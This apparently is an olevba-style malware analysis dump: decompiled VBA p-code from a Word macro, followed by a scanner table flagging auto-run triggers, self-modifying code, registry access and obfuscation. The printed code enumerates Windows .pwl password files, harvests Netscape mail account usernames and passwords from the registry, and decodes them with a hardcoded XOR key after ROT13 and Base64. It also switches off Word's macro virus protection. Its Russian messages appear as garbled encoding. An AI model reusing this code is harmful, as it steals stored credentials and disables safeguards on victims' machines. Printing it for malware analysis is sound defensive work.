' Line #404:
' 	Ld Char 
' 	Ld LMask 
' 	And 
' 	Paren 
' 	Ld Shift 
' 	Mul 
' 	St Roll 
' Line #405:
' 	Ld Tmp 
' 	Ld ABC 
' 	Ld Cod 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	Add 
' 	St Tmp 
' Line #406:
' 	Ld HMask 
' 	LitDI2 0x0004 
' 	Mul 
' 	LitDI2 0x00FF 
' 	And 
' 	St HMask 
' Line #407:
' 	Ld LMask 
' 	LitDI2 0x0004 
' 	Mul 
' 	LitDI2 0x0003 
' 	Add 
' 	St LMask 
' Line #408:
' 	Ld Shift 
' 	LitDI2 0x0004 
' 	IDiv 
' 	St Shift 
' Line #409:
' 	Ld HMask 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #410:
' 	Ld Tmp 
' 	Ld ABC 
' 	Ld Roll 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	Add 
' 	St Tmp 
' Line #411:
' 	LitDI2 0x00FC 
' 	St HMask 
' Line #412:
' 	LitDI2 0x0003 
' 	St LMask 
' Line #413:
' 	LitDI2 0x0010 
' 	St Shift 
' Line #414:
' 	LitDI2 0x0000 
' 	St Roll 
' Line #415:
' 	EndIfBlock 
' Line #416:
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Add 
' 	St Counter 
' Line #417:
' 	StartForVariable 
' 	Next 
' Line #418:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #419:
' 	Ld Shift 
' 	LitDI2 0x0010 
' 	Lt 
' 	IfBlock 
' Line #420:
' 	Ld Tmp 
' 	Ld ABC 
' 	Ld Roll 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	Add 
' 	St Tmp 
' Line #421:
' 	EndIfBlock 
' Line #422:
' 	Ld Tmp 
' 	FnLen 
' 	Paren 
' 	LitDI2 0x0004 
' 	Mod 
' 	Paren 
' 	St Cod 
' Line #423:
' 	Ld Cod 
' 	IfBlock 
' Line #424:
' 	Ld Tmp 
' 	LitDI2 0x0004 
' 	Ld Cod 
' 	Sub 
' 	LitStr 0x0001 "="
' 	ArgsLd String$$ 0x0002 
' 	Add 
' 	St Tmp 
' Line #425:
' 	EndIfBlock 
' Line #426:
' 	Ld Tmp 
' 	St Base64 
' Line #427:
' 	EndFunc 
' Line #428:
' 	FuncDefn (Function FindPWL(j As Integer, FindFiles As ))
' Line #429:
' 	OptionBase 
' 	LitDI2 0x0000 
' 	Redim FindFiles 0x0001 (As Variant)
' Line #430:
' 	LitStr 0x0010 "c:\windows\*.pwl"
' 	ArgsLd Dir$ 0x0001 
' 	LitDI2 0x0000 
' 	ArgsSt FindFiles 0x0001 
' Line #431:
' 	LitDI2 0x0000 
' 	ArgsLd FindFiles 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #432:
' 	ExitFunc 
' Line #433:
' 	EndIfBlock 
' Line #434:
' 	LitDI2 0x0000 
' 	St j 
' Line #435:
' 	LitDI2 0x0000 
' 	ArgsLd FindFiles 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #436:
' 	Ld Dir 
' 	LitDI2 0x0000 
' 	ArgsSt FindFiles 0x0001 
' Line #437:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' Line #438:
' 	Loop 
' Line #439:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #440:
' 	LitDI2 0x0000 
' 	Ld j 
' 	LitDI2 0x0001 
' 	Sub 
' 	Redim FindFiles 0x0001 (As Variant)
' Line #441:
' 	LitStr 0x0010 "c:\windows\*.pwl"
' 	ArgsLd Dir$ 0x0001 
' 	LitDI2 0x0000 
' 	ArgsSt FindFiles 0x0001 
' Line #442:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld j 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #443:
' 	Ld Dir$ 
' 	Ld j 
' 	ArgsSt FindFiles 0x0001 
' Line #444:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #445:
' 	ElseBlock 
' Line #446:
' 	LitStr 0x0010 "c:\windows\*.pwl"
' 	ArgsLd Dir$ 0x0001 
' 	LitDI2 0x0000 
' 	ArgsSt FindFiles 0x0001 
' Line #447:
' 	EndIfBlock 
' Line #448:
' 	EndFunc 
' Line #449:
' Line #450:
' 	FuncDefn (Function Adapt(Cod As String))
' Line #451:
' 	Dim 
' 	VarDefn PostCod (As String)
' Line #452:
' 	Dim 
' 	VarDefn i (As Long)
' Line #453:
' 	OnError (Resume Next) 
' Line #454:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Cod 
' 	FnLen 
' 	For 
' Line #455:
' 	Ld i 
' 	LitDI2 0x004C 
' 	Ge 
' 	Ld i 
' 	LitDI2 0x004C 
' 	Mod 
' 	Paren 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #456:
' 	Ld PostCod 
' 	Ld Cod 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	LitStr 0x0001 "#"
' 	Add 
' 	St PostCod 
' Line #457:
' 	ElseBlock 
' Line #458:
' 	Ld PostCod 
' 	Ld Cod 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St PostCod 
' Line #459:
' 	EndIfBlock 
' Line #460:
' 	StartForVariable 
' 	Next 
' Line #461:
' 	LitStr 0x0001 "#"
' 	Ld PostCod 
' 	Add 
' 	LitStr 0x0001 "#"
' 	Add 
' 	St Adapt 
' Line #462:
' 	EndFunc 
' Line #463:
' 	FuncDefn (Function Random1(i As Integer))
' Line #464:
' 	Dim 
' 	VarDefn Resalt (As Integer)
' Line #465:
' 	Ld i 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St Resalt 
' Line #466:
' 	Ld Resalt 
' 	St Random1 
' Line #467:
' 	EndFunc 
' Line #468:
' Line #469:
' 	FuncDefn (Sub ToolsOptions())
' Line #470:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #471:
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' Line #472:
' 	LitVarSpecial (True)
' 	MemStWith SaveNormalPrompt 
' Line #473:
' 	EndWith 
' Line #474:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #475:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #476:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #477:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #478:
' 	EndWith 
' Line #479:
' 	EndSub 
' Line #480:
' 	QuoteRem 0x0000 0x0024 "************************************"
' Line #481:
' Line #482:
' 	FuncDefn (Sub Grab_Registr())
' Line #483:
' 	Dim 
' 	VarDefn Resalt (As String)
' Line #484:
' 	ArgsLd Grab_Registr_main 0x0000 
' 	St Resalt 
' Line #485:
' 	Ld Resalt 
' 	ArgsCall PrintResalt 0x0001 
' Line #486:
' 	EndSub 
' Line #487:
' 	FuncDefn (Function Grab_Registr_main())
' Line #488:
' 	Dim 
' 	VarDefn res (As Long)
' 	VarDefn hkey (As Long)
' 	VarDefn i (As Long)
' Line #489:
' 	Dim 
' 	VarDefn KeyName (As String)
' 	VarDefn KeyLen (As Long)
' Line #490:
' 	Dim 
' 	VarDefn ClassName (As String)
' 	VarDefn ClassLen (As Long)
' Line #491:
' 	Dim 
' 	VarDefn lastwrite
' Line #492:
' 	Dim 
' 	VarDefn res1 (As Long)
' 	VarDefn hkey1 (As Long)
' 	VarDefn n (As Long)
' Line #493:
' 	Dim 
' 	VarDefn KeyName1 (As String)
' 	VarDefn KeyLen1 (As Long)
' Line #494:
' 	Dim 
' 	VarDefn ClassName1 (As String)
' 	VarDefn ClassLen1 (As Long)
' Line #495:
' 	Dim 
' 	VarDefn lastwrite1
' Line #496:
' 	Dim 
' 	VarDefn userName (As String)
' Line #497:
' 	Dim 
' 	VarDefn PassWord (As String)
' Line #498:
' 	Dim 
' 	VarDefn Resalt (As String)
' Line #499:
' 	Dim 
' 	VarDefn Version (As String)
' Line #500:
' 	Dim 
' 	VarDefn j (As Long)
' Line #501:
' 	OnError (Resume Next) 
' Line #502:
' 	LitStr 0x0000 ""
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Resalt 
' Line #503:
' 	LitHI4 0x0001 0x8000 
' 	LitStr 0x0030 "Software\Netscape\Netscape Navigator\biff\users\"
' 	LitDI2 0x0000 
' 	LitHI2 0x0008 
' 	Ld hkey 
' 	ArgsLd RegOpenKeyEx 0x0005 
' 	St res 
' Line #504:
' 	Ld res 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #505:
' 	LitStr 0x0079 "Íå óäàåòñÿ ïðî÷èòàòü íóæíóþ çàïèñü èç ðåeñòðà. Âåðîÿòíî, íà Âàøåì êîìïüþòåðå íå óñòàíîâëåíà ïðîãðàììà Netscape Navigator."
' 	St Resalt 
' Line #506:
' 	Ld Resalt 
' 	St Grab_Registr_main 
' Line #507:
' 	ExitFunc 
' Line #508:
' 	EndIfBlock 
' Line #509:
' 	LitDI2 0x0000 
' 	St i 
' Line #510:
' 	Ld res 
' 	LitDI2 0x0000 
' 	Eq 
' 	DoWhile 
' Line #511:
' 	LitDI2 0x00FF 
' 	ArgsLd Space 0x0001 
' 	St KeyName 
' 	BoS 0x0000 
' 	LitDI2 0x00FF 
' 	ArgsLd Space 0x0001 
' 	St ClassName 
' Line #512:
' 	LitDI2 0x00FF 
' 	St KeyLen 
' 	BoS 0x0000 
' 	LitDI2 0x00FF 
' 	St ClassLen 
' Line #513:
' 	Ld hkey 
' 	Ld i 
' 	Ld KeyName 
' 	Ld KeyLen 
' 	LitDI2 0x0000 
' 	ParamByVal 
' 	Ld ClassName 
' 	Ld ClassLen 
' 	Ld lastwrite 
' 	ArgsLd RegEnumKeyEx 0x0008 
' 	St res 
' Line #514:
' 	Ld res 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #515:
' 	Ld KeyName 
' 	Ld KeyLen 
' 	ArgsLd LBound 0x0002 
' 	St KeyName 
' Line #516:
' 	Ld ClassName 
' 	Ld ClassLen 
' 	ArgsLd LBound 0x0002 
' 	St ClassName 
' Line #517:
' Line #518:
' 	LitHI4 0x0001 0x8000 
' 	LitStr 0x0030 "Software\Netscape\Netscape Navigator\biff\users\"
' 	Ld KeyName 
' 	Add 
' 	LitStr 0x0009 "\servers\"
' 	Add 
' 	LitDI2 0x0000 
' 	LitHI2 0x0008 
' 	Ld hkey1 
' 	ArgsLd RegOpenKeyEx 0x0005 
' 	St res1 
' Line #519:
' 	LitDI2 0x0000 
' 	St n 
' Line #520:
' 	Ld res1 
' 	LitDI2 0x0000 
' 	Eq 
' 	DoWhile 
' Line #521:
' 	LitDI2 0x00FF 
' 	ArgsLd Space 0x0001 
' 	St KeyName1 
' 	BoS 0x0000 
' 	LitDI2 0x00FF 
' 	ArgsLd Space 0x0001 
' 	St ClassName1 
' Line #522:
' 	LitDI2 0x00FF 
' 	St KeyLen1 
' 	BoS 0x0000 
' 	LitDI2 0x00FF 
' 	St ClassLen1 
' 	QuoteRem 0x0021 0x0000 ""
' Line #523:
' 	Ld hkey1 
' 	Ld n 
' 	Ld KeyName1 
' 	Ld KeyLen1 
' 	LitDI2 0x0000 
' 	ParamByVal 
' 	Ld ClassName1 
' 	Ld ClassLen1 
' 	Ld lastwrite1 
' 	ArgsLd RegEnumKeyEx 0x0008 
' 	St res1 
' Line #524:
' 	Ld res1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #525:
' 	Ld KeyName1 
' 	Ld KeyLen1 
' 	ArgsLd LBound 0x0002 
' 	St KeyName1 
' Line #526:
' 	Ld ClassName1 
' 	Ld ClassLen1 
' 	ArgsLd LBound 0x0002 
' 	St ClassName1 
' Line #527:
' 	LitStr 0x0000 ""
' 	LitStr 0x0042 "HKEY_CURRENT_USER\Software\Netscape\Netscape Navigator\biff\users\"
' 	Ld KeyName 
' 	Add 
' 	LitStr 0x0009 "\servers\"
' 	Add 
' 	Ld KeyName1 
' 	Add 
' 	LitStr 0x0008 "userName"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St userName 
' Line #528:
' 	LitStr 0x0000 ""
' 	LitStr 0x0042 "HKEY_CURRENT_USER\Software\Netscape\Netscape Navigator\biff\users\"
' 	Ld KeyName 
' 	Add 
' 	LitStr 0x0009 "\servers\"
' 	Add 
' 	Ld KeyName1 
' 	Add 
' 	LitStr 0x0008 "password"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St PassWord 
' Line #529:
' 	LineCont 0x000C 08 00 01 00 15 00 01 00 1E 00 01 00
' 	Ld Resalt 
' 	LitStr 0x000E "Ïîëüçîâàòåëü: "
' 	Add 
' 	Ld KeyName 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000D "POP3-ñåðâåð: "
' 	Add 
' 	Ld KeyName1 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001F "Èìÿ Àêêàóíòà äëÿ POP3-ñåðâåðà: "
' 	Add 
' 	Ld userName 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld PassWord 
' 	ArgsLd Decode_Password 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Resalt 
' Line #530:
' 	EndIfBlock 
' Line #531:
' 	Ld n 
' 	LitDI2 0x0001 
' 	Add 
' 	St n 
' Line #532:
' 	Loop 
' Line #533:
' 	Ld hkey1 
' 	ArgsLd RegCloseKey 0x0001 
' 	St res1 
' Line #534:
' 	EndIfBlock 
' Line #535:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #536:
' 	Ld j 
' 	Ld n 
' 	Add 
' 	LitDI2 0x0001 
' 	Sub 
' 	St j 
' Line #537:
' 	ArgsCall DoEvents 0x0000 
' Line #538:
' 	Loop 
' Line #539:
' 	Ld hkey 
' 	ArgsLd RegCloseKey 0x0001 
' 	St res 
' Line #540:
' 	LitStr 0x0000 ""
' 	LitStr 0x0037 "HKEY_LOCAL_MACHINE\Software\Netscape\Netscape Navigator"
' 	LitStr 0x000E "CurrentVersion"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St Version 
' Line #541:
' 	LitStr 0x0045 "*ïðîãðàììà òåñòèðîâàíà òîëüêî äëÿ âåðñèè Netscape Navigator 4.51(ru)*"
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001B "Ó Âàñ Netscape Navigator - "
' 	Add 
' 	Ld Version 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 "Ïîëüçîâàòåëåé - "
' 	Add 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0015 "Ïî÷òîâûõ Àêêàóíòîâ - "
' 	Add 
' 	Ld j 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	Ld Resalt 
' 	Add 
' 	St Resalt 
' Line #542:
' 	Ld Resalt 
' 	St Grab_Registr_main 
' Line #543:
' 	EndFunc 
' Line #544:
' 	FuncDefn (Function Decode_Password(Cod As String))
' Line #545:
' 	Dim 
' 	VarDefn Key (As Variant)
' Line #546:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #547:
' 	Dim 
' 	VarDefn n (As Integer)
' Line #548:
' 	Dim 
' 	VarDefn Title (As String)
' Line #549:
' 	Ld Cod 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #550:
' 	LitStr 0x0028 "Äàííûé ïîëüçîâàòåëü íå óñòàíîâèë ôëàæîê "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 "Çàïîìíèòü ïàðîëü"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Title 
' Line #551:
' 	Ld Title 
' 	St Decode_Password 
' Line #552:
' 	ExitFunc 
' Line #553:
' 	EndIfBlock 
' Line #554:
' 	LitDI2 0x0056 
' 	LitDI2 0x00C9 
' 	LitDI2 0x00EF 
' 	LitDI2 0x004A 
' 	LitDI2 0x009B 
' 	LitDI2 0x00BE 
' 	LitDI2 0x005A 
' 	LitDI2 0x0042 
' 	LitDI2 0x0077 
' 	LitDI2 0x0002 
' 	LitDI2 0x0043 
' 	LitDI2 0x0018 
' 	LitDI2 0x0070 
' 	LitDI2 0x0030 
' 	LitDI2 0x0089 
' 	LitDI2 0x004C 
' 	ArgsArray Array 0x0010 
' 	St Key 
' Line #555:
' 	Ld Cod 
' 	ArgsLd Revers 0x0001 
' 	St Cod 
' Line #556:
' 	Ld Cod 
' 	ArgsLd ROT_13 0x0001 
' 	St Cod 
' Line #557:
' 	Ld Cod 
' 	ArgsLd Decode_Base_64 0x0001 
' 	St Cod 
' Line #558:
' 	Ld Cod 
' 	FnLen 
' 	St n 
' Line #559:
' 	Ld n 
' 	LitDI2 0x0010 
' 	Gt 
' 	IfBlock 
' Line #560:
' 	LitDI2 0x0010 
' 	St n 
' Line #561:
' 	LitStr 0x0024 "Ïåðâûå øåñòíàäöàòü ñèìâîëîâ ïàðîëÿ: "
' 	St Title 
' Line #562:
' 	ElseBlock 
' Line #563:
' 	LitStr 0x0008 "Ïàðîëü: "
' 	St Title 
' Line #564:
' 	EndIfBlock 
' Line #565:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld n 
' 	For 
' Line #566:
' 	Ld Title 
' 	Ld Cod 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Key 0x0001 
' 	Xor 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Title 
' Line #567:
' 	StartForVariable 
' 	Next 
' Line #568:
' 	Ld Title 
' 	St Decode_Password 
' Line #569:
' 	EndFunc 
' Line #570:
' 	FuncDefn (Function ROT_13(Cod As String))
' Line #571:
' 	Dim 
' 	VarDefn La (As String)
' Line #572:
' 	Dim 
' 	VarDefn Smol (As String)
' Line #573:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #574:
' 	Dim 
' 	VarDefn n (As Integer)
' Line #575:
' 	Dim 
' 	VarDefn Char (As String)
' Line #576:
' 	Dim 
' 	VarDefn ChNumber (As Integer)
' Line #577:
' 	Dim 
' 	VarDefn Tmp (As String)
' Line #578:
' 	LitStr 0x001A "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
' 	St La 
' Line #579:
' 	LitStr 0x001A "abcdefghijklmnopqrstuvwxyz"
' 	St Smol 
' Line #580:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Cod 
' 	FnLen 
' 	For 
' Line #581:
' 	Ld Cod 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St Char 
' Line #582:
' 	LitDI2 0x0001 
' 	Ld La 
' 	Ld Char 
' 	Ld vbBinaryCompare 
' 	FnInStr4 
' 	St ChNumber 
' Line #583:
' 	Ld ChNumber 
' 	SelectCase 
' Line #584:
' 	LitDI2 0x0001 
' 	LitDI2 0x000D 
' 	CaseTo 
' 	CaseDone 
' Line #585:
' 	Ld Tmp 
' 	Ld La 
' 	Ld ChNumber 
' 	LitDI2 0x000D 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St Tmp 
' Line #586:
' 	LitDI2 0x000D 
' 	CaseGt 
' 	CaseDone 
' Line #587:
' 	Ld Tmp 
' 	Ld La 
' 	Ld ChNumber 
' 	LitDI2 0x000D 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St Tmp 
' Line #588:
' 	CaseElse 
' Line #589:
' 	LitDI2 0x0001 
' 	Ld Smol 
' 	Ld Char 
' 	Ld vbBinaryCompare 
' 	FnInStr4 
' 	St ChNumber 
' Line #590:
' 	Ld ChNumber 
' 	SelectCase 
' Line #591:
' 	LitDI2 0x0001 
' 	LitDI2 0x000D 
' 	CaseTo 
' 	CaseDone 
' Line #592:
' 	Ld Tmp 
' 	Ld Smol 
' 	Ld ChNumber 
' 	LitDI2 0x000D 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St Tmp 
' Line #593:
' 	LitDI2 0x000D 
' 	CaseGt 
' 	CaseDone 
' Line #594:
' 	Ld Tmp 
' 	Ld Smol 
' 	Ld ChNumber 
' 	LitDI2 0x000D 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St Tmp 
' Line #595:
' 	CaseElse 
' Line #596:
' 	Ld Tmp 
' 	Ld Char 
' 	Add 
' 	St Tmp 
' Line #597:
' 	EndSelect 
' Line #598:
' 	EndSelect 
' Line #599:
' 	StartForVariable 
' 	Next 
' Line #600:
' 	Ld Tmp 
' 	St ROT_13 
' Line #601:
' 	EndFunc 
' Line #602:
' 	FuncDefn (Function Decode_Base_64(Cod As String))
' Line #603:
' 	Dim 
' 	VarDefn i (As Long)
' Line #604:
' 	Dim 
' 	VarDefn AlfaBet (As String)
' Line #605:
' 	Dim 
' 	VarDefn Chop (As Integer)
' Line #606:
' 	Dim 
' 	VarDefn HiMask (As Integer)
' Line #607:
' 	Dim 
' 	VarDefn LowMask (As Integer)
' Line #608:
' 	Dim 
' 	VarDefn HiShift (As Integer)
' Line #609:
' 	Dim 
' 	VarDefn LowShift (As Integer)
' Line #610:
' 	Dim 
' 	VarDefn Charset (As Integer)
' Line #611:
' 	Dim 
' 	VarDefn First (As Integer)
' 	VarDefn Second (As Integer)
' Line #612:
' 	Dim 
' 	VarDefn Resalt (As String)
' Line #613:
' 	Ld Cod 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #614:
' 	LitStr 0x0000 ""
' 	St Decode_Base_64 
' Line #615:
' 	ExitFunc 
' Line #616:
' 	EndIfBlock 
' Line #617:
' 	LitStr 0x0040 "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
' 	St AlfaBet 
' Line #618:
' 	LitDI2 0x003F 
' 	St Chop 
' Line #619:
' 	LitDI2 0x003F 
' 	St HiMask 
' Line #620:
' 	LitDI2 0x0000 
' 	St LowMask 
' Line #621:
' 	LitDI2 0x0004 
' 	St HiShift 
' Line #622:
' 	LitDI2 0x0040 
' 	St LowShift 
' Line #623:
' 	LitStr 0x0000 ""
' 	St Resalt 
' Line #624:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Cod 
' 	FnLen 
' 	For 
' Line #625:
' 	LitDI2 0x0001 
' 	Ld AlfaBet 
' 	Ld Cod 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld vbBinaryCompare 
' 	FnInStr4 
' 	LitDI2 0x0001 
' 	Sub 
' 	St Charset 
' Line #626:
' 	Ld Charset 
' 	LitDI2 0x0000 
' 	Ge 
' 	IfBlock 
' Line #627:
' 	Ld Charset 
' 	Ld LowMask 
' 	And 
' 	Paren 
' 	Ld LowShift 
' 	Div 
' 	St Second 
' Line #628:
' 	Ld HiMask 
' 	LitDI2 0x003F 
' 	Ne 
' 	IfBlock 
' Line #629:
' 	Ld Resalt 
' 	Ld First 
' 	Ld Second 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Resalt 
' Line #630:
' 	EndIfBlock 
' Line #631:
' 	Ld Charset 
' 	Ld HiMask 
' 	And 
' 	Paren 
' 	Ld HiShift 
' 	Mul 
' 	St First 
' Line #632:
' 	Ld HiMask 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #633:
' 	LitDI2 0x003F 
' 	St HiMask 
' Line #634:
' 	LitDI2 0x0000 
' 	St LowMask 
' Line #635:
' 	LitDI2 0x0004 
' 	St HiShift 
' Line #636:
' 	LitDI2 0x0040 
' 	St LowShift 
' Line #637:
' 	ElseBlock 
' Line #638:
' 	Ld HiMask 
' 	LitDI2 0x0004 
' 	Mul 
' 	Paren 
' 	Ld HiMask 
' 	And 
' 	Paren 
' 	LitDI2 0x0004 
' 	Div 
' 	St HiMask 
' Line #639:
' 	LitDI2 0x003F 
' 	Ld HiMask 
' 	Xor 
' 	St LowMask 
' Line #640:
' 	Ld HiShift 
' 	LitDI2 0x0004 
' 	Mul 
' 	St HiShift 
' Line #641:
' 	Ld LowShift 
' 	LitDI2 0x0004 
' 	Div 
' 	St LowShift 
' Line #642:
' 	EndIfBlock 
' Line #643:
' 	EndIfBlock 
' Line #644:
' 	StartForVariable 
' 	Next 
' Line #645:
' 	Ld Resalt 
' 	St Decode_Base_64 
' Line #646:
' 	EndFunc 
' Line #647:
' 	FuncDefn (Function Revers(MyString As String))
' Line #648:
' 	Dim 
' 	VarDefn Temp (As String)
' 	VarDefn i (As Long)
' Line #649:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld MyString 
' 	FnLen 
' 	For 
' Line #650:
' 	Ld Temp 
' 	Ld MyString 
' 	Ld MyString 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld i 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	Add 
' 	St Temp 
' Line #651:
' 	StartForVariable 
' 	Next 
' Line #652:
' 	Ld Temp 
' 	St Revers 
' Line #653:
' 	EndFunc 
' Line #654:
' 	FuncDefn (Sub PrintResalt(MyString As String))
' Line #655:
' 	Dim 
' 	VarDefn MyRang (As Object)
' Line #656:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #657:
' 	Ld ActiveDocument 
' 	ArgsMemCall Activate 0x0000 
' Line #658:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	Set MyRang 
' Line #659:
' 	Ld MyString 
' 	Ld MyRang 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #660:
' 	EndSub 
' Line #661:
' Line #662:
' Line #663:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegOpenKeyEx        |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
